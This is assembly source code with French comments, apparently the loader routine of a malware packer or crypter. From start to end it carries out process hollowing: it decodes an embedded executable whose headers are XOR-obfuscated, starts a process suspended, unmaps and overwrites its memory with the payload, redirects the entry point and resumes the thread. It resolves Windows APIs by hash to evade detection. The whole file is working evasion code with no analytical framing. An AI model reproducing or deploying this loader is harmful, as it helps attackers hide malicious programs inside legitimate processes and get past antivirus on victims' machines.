section .text
%define OBS ; Compiling with or without obfuscation


; Parse l'exe et lance.

_peexec:

	mov	esi,[PEBASE]
	lodsw
	cmp	ax,'MZ' ^ ((RANDOM8 << 8) + RANDOM8) ; est-ce bien un EXE
	jne	.end

	add	esi,IMAGE_DOS_HEADER__PEOffset - 0x2 
	lodsd
	mov	esi,[PEBASE]
	add	esi,eax
	cmp	eax,0xFF  ; mAXIMUM OFFEST OF pe au cas ou pour éviter le segfault
	ja	.end

	lodsw
	cmp	ax,'PE' ^ ((RANDOM8 << 8) + RANDOM8 )		; Est ce bien un PE Ready PE
	jne	.end
	add	esi, 2+2 
	lodsw	; Read Sections count
	mov	[PESECTION],ax
	add	esi, 3 * 0x4
	lodsw ; Read SizeOfOptionalHeader
	add	esi,2
	
	mov	[PEOPTHEADER],esi
	; EDI point sur MAGIC nubrer 10B
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__AddressOfEntryPoint]	
	mov	[PEENTRY],eax
	
	mov	eax,[esi + IMAGE_OPTIONAL_HEADER__ImageBase] 
	mov	[PEIMAGEBASE],eax

	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfImage]
	mov	[PEZOFIMAGE],eax
  mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfHeaders]
	mov	[PEZOFHEADERS],eax
	

	mov	ebx,[PEBASE]
	add	ebx,[PELEN]
	PIS_LEN equ 0x54
	SIS_LEN equ 0x10

	; Request memory for process Information and startup information structure
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC
	invokel eax, NULL, 0x10 + 0x44 , MEM_COMMIT, PAGE_READWRITE
	cmp eax,0
	je	.end

	mov	[SIS],eax  ; len 0x44 
	add	eax,0x44 
	mov	[PIS],eax ;Process information len 0x10


	; Create processus
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_CREATEPROCESSA
	invokel eax,FILE, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, dword [SIS], dword [PIS]
	cmp	eax,0
	je	.end

	
	; Request memory for process Context
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC

;	invokel eax, NULL, 4 , MEM_COMMIT, PAGE_READWRITE
	invokel eax, NULL, CTX__LEN, MEM_COMMIT, PAGE_READWRITE
	cmp eax,0
	je	.end
	mov	[CTX],eax
	mov	dword [eax], CONTEXT_FULL ; Set le type de context à full


	; Request for this new process CPU context
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_GETTHREADCONTEXT
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hThread]
	mov	ebx,[CTX]
	invokel eax,ecx,ebx
	cmp	eax,0
	je	.end


	; Récupère la base addresse d'ou est lancé le PE, via le PEB du process
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_READPROCESSMEMORY
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	mov	ebx,[CTX]
	mov	ebx,[ebx+CTX__EBX]
	add	ebx,PEB__ImageBaseAdress 		; Pointera sur PEB + 8
	invokel eax, ecx, ebx, vRPEBASE, 4, NULL 
	cmp	eax,0
	je	.end
	
	; vRPEBASE est notre nouvelle base addresse.

	; Si par malheur la Base address collision avec celle de notre PE packé on Demappe la section
	mov eax,[PEIMAGEBASE]  ; base image from PE include file 
	cmp	eax,[vRPEBASE]   ; 	base addresse form running PE
	jne	.bypassunmap

	; Unmap le PE si ils sont sur la meme base addresse

	invokel _getdll,HASH_NTDLL.DLL
	invokel _getfunction, eax, HASH_NTUNMAPVIEWOFSECTION
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	invokel eax,ecx,dword [vRPEBASE]
	

.bypassunmap
	
	; Realloue la mémoire necessaire dans le procsess
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOCEX
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	; 3000 --> MEM_COMMIT || MEM_RESERVE
	mov	edx,[PEZOFIMAGE]
	; add edx,0x1000
	;mov	edx,0x20000
	invokel eax,ecx, dword [PEIMAGEBASE],edx,0x3000,PAGE_EXECUTE_READWRITE
	

	mov	[PIMAGEBASE],eax
	cmp	eax,0
	je	.end

  ; Debofusque MZ et PE
  mov eax,[PEBASE]
  xor dword [EAX], ((RANDOM8 << 8) + RANDOM8) 
  mov eax, [IMAGE_DOS_HEADER__PEOffset + EAX ]
  add eax,[PEBASE]
  xor dword [EAX], ((RANDOM8 << 8) + RANDOM8) 


	; Recopie les Headers du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	invokel eax,ecx,dword [PIMAGEBASE],dword [PEBASE],dword [PEZOFHEADERS],NULL
	cmp	eax,0
	je	.end

  

	; Recopie chaque section du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	mov	ebx,[PEOPTHEADER]
	add	ebx , IMAGE_FILE_HEADER_LEN + IMAGE_OPTIONAL_HEADER__LEN + IMAGE_DATA_DIRECTORY__LEN
	dec	word [PESECTION]

.recopiesect:
	
	mov	ecx,[ebx + IMAGE_SECTION_HEADER__VirtualAddress ]
	add ecx,[PIMAGEBASE]
	
	mov	edx,[ebx + IMAGE_SECTION_HEADER__PointerToRawData ]
	add	edx,[PEBASE]
	
	mov	edi,[ebx + IMAGE_SECTION_HEADER__SizeOfRawData ]
	
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hProcess]
	
	push	eax
	push	ebx	
	invokel eax,esi,ecx, edx, edi, NULL
	pop		ebx
	pop		eax
  

	add	ebx,IMAGE_SECTION_HEADER__LEN


	dec	word [PESECTION]
	cmp	word [PESECTION],0
	jns	.recopiesect

	; Replace la base addresse du process dans le contexte du process 

	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hProcess]
	
  mov ebx,[CTX]
  mov ebx,[ebx+CTX__EBX]
	add ebx,PEB__ImageBaseAdress    ; Pointera sur PEB + 8

	invokel eax,esi,ebx,PIMAGEBASE,4,NULL	
	
	; Replace l'entry Point dans l'eax du contexte
	mov ebx,[CTX]
	mov	eax,[PEENTRY]
	add eax,[PIMAGEBASE]
	mov	[ebx+CTX__EAX],eax

	; Replace le context dans la thread
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_SETTHREADCONTEXT
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hThread]
	invokel eax,esi,dword [CTX]


	; Relache la thread
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_RESUMETHREAD
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hThread ]

	invokel eax,esi

.end:

	ret
	

